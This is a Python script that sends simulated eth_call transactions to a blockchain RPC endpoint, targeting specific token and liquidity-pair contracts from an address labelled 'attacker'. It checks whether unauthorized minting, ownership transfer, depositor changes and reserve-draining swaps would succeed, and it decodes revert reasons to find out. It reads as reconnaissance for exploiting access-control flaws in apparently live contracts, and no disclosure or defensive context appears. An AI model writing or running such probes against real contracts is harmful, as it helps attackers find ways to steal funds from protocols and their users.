import json, urllib.request, time, subprocess
URL="https://rpc.grxchain.io"
_sel={}
def sel(sig):
    if sig not in _sel: _sel[sig]=subprocess.check_output(["cast","sig",sig]).decode().strip()
    return _sel[sig]
def pad(a): return a.lower().replace("0x","").rjust(64,"0")
ATK="0x1111111111111111111111111111111111111111"
def call(to,data,fr=ATK,value=None):
    tx={"to":to,"data":data,"from":fr}
    if value: tx["value"]=hex(value)
    req={"jsonrpc":"2.0","id":1,"method":"eth_call","params":[tx,"latest"]}
    r=urllib.request.Request(URL,data=json.dumps(req).encode(),headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        resp=json.load(urllib.request.urlopen(r,timeout=60))
    except Exception as e:
        return f"HTTP_ERR {e}"
    if "error" in resp:
        e=resp["error"]
        # try decode revert reason
        data=e.get("data","")
        reason=""
        if isinstance(data,str) and data.startswith("0x08c379a0"):
            import binascii
            b=bytes.fromhex(data[10:])
            # offset 32, len at 32..64, string after
            try:
                ln=int.from_bytes(b[32:64],"big"); reason=b[64:64+ln].decode(errors="replace")
            except Exception: pass
        return f"REVERT {e.get('message')} {reason}"
    return "OK "+resp.get("result","")[:100]
tests=[
 ("pair1.swap(1,1) no input","0x47b7F566A7c2F827d16a2336684B31929E1cB386",sel("swap(uint256,uint256,address,bytes)")+hex(1)[2:].rjust(64,"0")+hex(1)[2:].rjust(64,"0")+pad(ATK)+hex(128)[2:].rjust(64,"0")+hex(0)[2:].rjust(64,"0")),
 ("pair1.swap(res0-1,res1-1)","0x47b7F566A7c2F827d16a2336684B31929E1cB386",None),
 ("pair1.mint(attacker)","0x47b7F566A7c2F827d16a2336684B31929E1cB386",sel("mint(address)")+pad(ATK)),
 ("pair1.initialize(attacker,attacker)","0x47b7F566A7c2F827d16a2336684B31929E1cB386",sel("initialize(address,address)")+pad(ATK)+pad(ATK)),
 ("pair1.skim(attacker)","0x47b7F566A7c2F827d16a2336684B31929E1cB386",sel("skim(address)")+pad(ATK)),
 ("pair1.burn(attacker)","0x47b7F566A7c2F827d16a2336684B31929E1cB386",sel("burn(address)")+pad(ATK)),
 ("pair1.sync()","0x47b7F566A7c2F827d16a2336684B31929E1cB386",sel("sync()")),
 ("USDT18_a.mint(attacker,1e18)","0x173462F5eb7CA0D1ab6aaea846fEFe85A28029E2",sel("mint(address,uint256)")+pad(ATK)+hex(10**18)[2:].rjust(64,"0")),
 ("USDT18_a.burn(attacker,1e18)","0x173462F5eb7CA0D1ab6aaea846fEFe85A28029E2",sel("burn(address,uint256)")+pad(ATK)+hex(10**18)[2:].rjust(64,"0")),
 ("USDT18_b.mint(attacker,1e18)","0x2aF568c4e3F7B1A66DAcaFf35eee757b85Cd4A75",sel("mint(address,uint256)")+pad(ATK)+hex(10**18)[2:].rjust(64,"0")),
 ("WGRX_b.ownerDeposit(1e18)","0x2bd8911f05Cb37a772f33BfEcB2f8db67B36B212",sel("ownerDeposit(uint256)")+hex(10**18)[2:].rjust(64,"0")),
 ("BTC.mintWithReference(attacker,1,0)","0x2F4632ABAd26A1FF9212a76597fb3c3d8539E275",sel("mintWithReference(address,uint256,bytes32)")+pad(ATK)+hex(1)[2:].rjust(64,"0")+"00"*32),
 ("ETH.mintWithReference(attacker,1,0)","0x02D129c8A26839c814925eE0f1D320F63114E1FE",sel("mintWithReference(address,uint256,bytes32)")+pad(ATK)+hex(1)[2:].rjust(64,"0")+"00"*32),
 ("USDT6.mint(attacker,1e6)","0x1d3bc9646d126D379b4da4d71c8a4fa6b830Dd20",sel("mint(address,uint256)")+pad(ATK)+hex(10**6)[2:].rjust(64,"0")),
 ("USDT18_a.setDepositor(attacker)","0x173462F5eb7CA0D1ab6aaea846fEFe85A28029E2",sel("setDepositor(address)")+pad(ATK)),
 ("USDT18_a.transferOwnership(attacker)","0x173462F5eb7CA0D1ab6aaea846fEFe85A28029E2",sel("transferOwnership(address)")+pad(ATK)),
]
for name,to,data in tests:
    if data is None:
        # read reserves first
        req={"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":to,"data":sel("getReserves()")},"latest"]}
        r=urllib.request.Request(URL,data=json.dumps(req).encode(),headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
        rr=json.load(urllib.request.urlopen(r,timeout=60))["result"]
        r0=int(rr[2:66],16); r1=int(rr[66:130],16)
        data=sel("swap(uint256,uint256,address,bytes)")+hex(r0-1)[2:].rjust(64,"0")+hex(r1-1)[2:].rjust(64,"0")+pad(ATK)+hex(128)[2:].rjust(64,"0")+hex(0)[2:].rjust(64,"0")
    print(f"{name}: {call(to,data)}")
